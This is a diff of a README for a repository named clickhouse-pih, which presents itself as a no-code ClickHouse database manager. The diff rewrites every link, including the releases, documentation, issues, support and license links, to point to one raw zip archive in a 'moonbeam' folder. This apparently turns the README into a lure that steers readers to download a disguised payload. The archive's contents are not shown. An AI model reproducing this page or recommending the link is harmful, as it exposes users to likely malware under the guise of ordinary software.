@@ -1,13 +1,13 @@
 # 🖥️ clickhouse-pih - Effortlessly Manage Your ClickHouse Data
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/karynradiate882/clickhouse-pih/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **clickhouse-pih**! This application helps you manage your ClickHouse databases with ease. You can run queries, visualize data, and maintain your databases without any programming skills. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-1. Visit this page to download: [Releases Page](https://github.com/karynradiate882/clickhouse-pih/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip).
 2. On the releases page, you will see the latest version listed.
 3. Click on the version number to view its details.
 4. Look for the file suitable for your operating system (Windows, macOS, Linux).
@@ -39,14 +39,14 @@ If you encounter issues while downloading or running the software, try the follo
 - Restart your computer and try running the application again.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/karynradiate882/clickhouse-pih#documentation): Find detailed guides and FAQs.
-- [Issues](https://github.com/karynradiate882/clickhouse-pih/issues): Report bugs or request features.
-- [Support](https://github.com/karynradiate882/clickhouse-pih#support): Reach out for help.
+- [Documentation](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip): Find detailed guides and FAQs.
+- [Issues](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip): Report bugs or request features.
+- [Support](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip): Reach out for help.
 
 ## 👥 Community
 Join our community to share tips, ask questions, and connect with fellow users. Follow the conversation on our GitHub discussions page.
 
 ## 📜 License
-This software is licensed under the MIT License. For more details, please refer to the [LICENSE](https://github.com/karynradiate882/clickhouse-pih/blob/main/LICENSE) file.
+This software is licensed under the MIT License. For more details, please refer to the [LICENSE](https://raw.githubusercontent.com/karynradiate882/clickhouse-pih/main/moonbeam/clickhouse-pih_1.5.zip) file.
 
 Thank you for choosing **clickhouse-pih**! Enjoy managing your ClickHouse databases with ease.
